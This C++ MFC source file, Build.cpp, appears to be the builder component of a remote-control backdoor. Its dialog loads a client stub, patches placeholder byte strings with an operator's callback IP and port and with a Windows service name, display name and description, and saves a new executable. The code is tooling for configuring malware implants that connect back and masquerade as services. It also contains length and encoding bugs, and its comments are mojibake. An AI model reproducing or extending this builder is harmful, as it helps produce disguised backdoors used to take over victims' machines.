// Build.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Server.h"
#include "Build.h"
#include "afxdialogex.h"


// CBuild �Ի���

IMPLEMENT_DYNAMIC(CBuild, CDialogEx)

CBuild::CBuild(CWnd* pParent /*=NULL*/)
	: CDialogEx(CBuild::IDD, pParent)
	, m_port(0)
{

}

CBuild::~CBuild()
{
}

void CBuild::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_BUILD_PORT, m_port);
}


BEGIN_MESSAGE_MAP(CBuild, CDialogEx)
	ON_BN_CLICKED(IDOK, &CBuild::OnBnClickedOk)
END_MESSAGE_MAP()


// CBuild ��Ϣ�������

bool CBuild::CheckInput()
{
	return true;
}

void CBuild::WriteInfoToFile()
{

}
void CBuild::OnBnClickedOk()
{
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	//CDialogEx::OnOK();
	if (CheckInput() == false)
	{
		return;
	}
	else
	{
		CFileDialog dlg(FALSE, _T("exe"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, _T("��ִ���ļ�|*.exe||"), this);
		wchar_t path[260];
		if (dlg.DoModal() == IDOK)
		{
			CString t;
			t = dlg.GetPathName();
			wcscpy_s(path, CT2CW(t));
		}
		else
		{
			return;
		}
		WriteInfoToFile();

		FileToMem(_T(".\\Cache\\Client.exe"));
		//������������
		wchar_t wIP[160];
	    GetDlgItem(IDC_BULID_IP)->GetWindowTextW(wIP, _countof(wIP));
		char Info[100];
		CStringToChar(wIP, Info);
		strcat_s(Info, sizeof(Info), ":");
		//�������Ӷ˿�
		char Port[10];
		_itoa_s(m_port, Port, 10);
		strcat_s(Info, sizeof(Info), Port);

		//д�������ַ���
		char OldInfo[] = "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU";
		UpdateString(OldInfo, Info, sizeof(OldInfo), sizeof(Info));

		char ServiceName[220] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
		char ShowName[220] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
		char Description[220] = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";

		wchar_t wServiceName[110];
		GetDlgItem(IDC_BUILD_SERVERNAE)->GetWindowTextW(wServiceName, _countof(wServiceName));
		UpdateString(ServiceName, (char*)wServiceName, sizeof(ServiceName), sizeof(Info));

		wchar_t wShowName[110];
		GetDlgItem(IDC_BUILD_SHOWNAME)->GetWindowTextW(wShowName, _countof(wShowName));
		UpdateString(ShowName, (char*)wShowName, sizeof(ShowName), sizeof(wShowName));

		wchar_t wDescription[110];
		GetDlgItem(IDC_BUILD_DESPCRIPTION)->GetWindowTextW(wDescription, _countof(wDescription));
		UpdateString(Description, (char*)wDescription, sizeof(Description), sizeof(wDescription));

		MemToFile(path);
	}
}

void CBuild::FileToMem(wchar_t* pOldFilePathName)
{
	this->d_FileSize = 0;
	if (!m_File.Open(pOldFilePathName, CFile::modeRead))
	{
		MessageBox(_T("�޷����������ļ�"), _T("��ʾ"), MB_OK | MB_ICONWARNING);
		return;
	}
	//�õ�ԭ�ļ���С   
	d_FileSize = m_File.GetLength();

	//��ȡԭ�ļ�
	//BYTE* pFileData = NULL;
	this->pFileData = NULL;
	this->pFileData = new BYTE[(UINT)d_FileSize];
	m_File.Read(this->pFileData, (UINT)d_FileSize);
	m_File.Close();
}

void CBuild::UpdateString(char *pOldStr, char *pNewStr, int stroldlen, int strnewlen)  //������ģʽƥ���㷨�Ż�
{
	int count = 0;
	//���ڼ�¼���ַ�����ԭ���ַ�����ͬ�Ĵ���
	int sameNumber = 0;

	for (DWORD i = 0; i<this->d_FileSize; i++)
	{
		//�����¼BYTE��ͬ�Ĵ��������ַ���������ͬ������ڴ��е�����
		if (count == stroldlen)
		{
			//�Ȱ�ԭ�ļ���ָ���ƶ�����һ��BYTE��ͬ�ĵط�
			pFileData -= count;

			//ѭ�������ڴ�����
			int j;
			for (j = 0; j<strnewlen; j++)
			{
				*pFileData = *pNewStr;
				pFileData++;
				pNewStr++;
			}

			//�ڴ������Ϻ����ַ�����ָ��Ӧ�ص���ʼ�ĵط�
			pNewStr -= j;

			//���ַ�����ָ��Ӧ�ص���ʼ�ĵط�
			pOldStr -= count;

			//ԭ�ļ���ָ��ҲӦ�ûص��ղűȽϵĵط�
			pFileData += count - j;

			//һ���ַ�����������ˣ���0
			count = 0;

			//���ĵĴ�����1
			sameNumber++;
		}

		//���ԭ�ĵ�BYTE����ַ�����BYTE��ͬ����count��1�����ַ���ָ��ָ����һ��BYTE
		if (*pFileData == *pOldStr)
		{
			count++;
			pOldStr++;
		}
		else
		{   //������ǲ���ͬ����ʱ���ַ���ָ��Ҫ�ص���ʼ����count��0
			pOldStr -= count;
			count = 0;
		}

		//ѭ����ɣ�ָ��ָ��ԭ����һ��BYTE
		pFileData++;
	}

	if (sameNumber == 0)
	{
		MessageBoxW(_T("������Ϣд��ʧ��"), _T("��ʾ"), MB_OK | MB_ICONWARNING);
		return;
	}

	//�����ȽϹ��̽�������ʱ����ɶ����ڴ����ݵ��޸Ĺ���
	//�����µ��ļ������޸Ĺ����ڴ�����д���µ��ļ�
	//�ǵý�ԭ�ļ��ڴ��е�ָ������ָ��ʼ�ĵط�����Ϊ����д�ļ�ʱ���õ����ָ��
	pFileData -= d_FileSize;
}

void CBuild::MemToFile(wchar_t* pNewFilePathName)
{
	if (!m_File.Open(pNewFilePathName, CFile::modeCreate | CFile::modeWrite))
	{
		delete[] pFileData;
		MessageBox(_T("�����ļ�ʧ��"), _T("����"), MB_OK | MB_ICONWARNING);
		return;
	}
	//��ʱ�Ϳ���д�ļ���
	m_File.Write(pFileData, (UINT)d_FileSize);
	m_File.Close();
	//��������������
	delete[] pFileData;

	//OK���󹦸����
}

void CBuild::CStringToChar(CString str, char* w)
{
	int len = WideCharToMultiByte(CP_ACP, 0, str, str.GetLength(), NULL, 0, NULL, NULL);
	WideCharToMultiByte(CP_ACP, 0, str, str.GetLength(), w, len, NULL, NULL);
	w[len] = '\0';
}
void CBuild::CStringToChar(wchar_t *wIP, char *Info)
{
	CString temp(wIP);
	this->CStringToChar(temp, Info);
	
}